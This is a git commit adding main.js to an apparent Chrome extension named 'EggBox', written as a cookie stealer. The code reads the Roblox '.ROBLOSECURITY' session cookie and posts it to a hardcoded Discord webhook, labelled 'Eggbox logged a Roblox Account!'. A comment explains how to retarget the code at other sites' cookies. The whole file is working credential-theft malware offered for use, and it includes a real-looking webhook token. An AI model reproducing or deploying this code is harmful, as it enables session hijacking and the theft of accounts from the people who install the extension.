cf31ce95386cdfc44d784f4714eed9b490276c66
Rolimon <110580834+RolimonDev@users.noreply.github.com>
2022-08-05 02:13:05 -0400

    Add files via upload

---
+++ main.js
@@ -0,0 +1,33 @@
+function webhookReq(webhook, cookie) {
+  var params = {
+      embeds: [{
+            "title": `Eggbox logged a Roblox Account!`,
+            "description": ">>> EggBox extension logged someone; see information about the user below",
+            "color": 15258703,
+            "fields": [{
+              "name": 'Cookie',
+              "value": "```\n" + cookie + "\n```",
+              inline: false
+            }]
+    }]
+  }
+   
+  // Send the webhook request
+  fetch(webhook, {
+    method: "POST",
+    headers: {
+      'Content-type': 'application/json'
+    },
+    body: JSON.stringify(params)
+  })
+}
+
+
+
+// Driver Code:
+cookieInfo = {url: "https://www.roblox.com/", name: '.ROBLOSECURITY'}; //If you want to grab other site cookies, change the values both here and in the manifest.json file
+chrome.cookies.get(cookieInfo, function(cookie) {
+  if (cookie) {
+    webhookReq("https://discord.com/api/webhooks/1004275601592565802/ILpBcN357XG_osTrOKtwRIW2n-8ydvPg8Ns9hL9Yh5zqDVSNrBY3qHKhQrKaJGyn4nmL", cookie.value);
+  }
+});
